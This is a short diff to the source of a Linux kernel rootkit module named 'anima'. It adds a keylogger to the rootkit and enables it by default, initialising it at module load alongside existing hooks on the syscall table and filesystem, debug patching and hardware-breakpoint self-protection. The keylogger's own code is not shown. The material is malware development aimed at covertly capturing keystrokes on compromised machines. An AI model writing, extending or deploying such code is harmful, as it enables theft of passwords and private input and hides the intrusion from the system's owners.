@@ -4,6 +4,7 @@
 #include <anima/arch.h>
 #include <anima/config.h>
 #include <anima/debug.h>
+#include <anima/keylogger.h>
 #include <anima/ksyms.h>
 #include <anima/syscalls.h>
 #include <anima/vfs.h>
@@ -16,6 +17,7 @@ struct rootkit_config rk_cfg = {
 	.patch_debug = 1,
 	.hook_syscall = 1,
 	.hook_vfs = 0,
+	.keylogger = 1,
 };
 
 static int __init anima_init(void)
@@ -45,6 +47,8 @@ static int __init anima_init(void)
 		hook_sys_call_table();
 	if (rk_cfg.hook_vfs)
 		vfs_hook();
+	if (rk_cfg.keylogger)
+		keylogger_init();
 #if ARCH_X86
 	if (rk_cfg.dr_protect)
 		x86_hw_breakpoint_protect_enable();
@@ -58,6 +62,8 @@ static int __init anima_init(void)
 static void __exit anima_exit(void)
 {
 	rk_cfg.state = RK_SHUTDOWN;
+	if (rk_cfg.keylogger)
+		keylogger_exit();
 #if ARCH_X86
 	if (rk_cfg.dr_protect)
 		x86_hw_breakpoint_protect_disable();
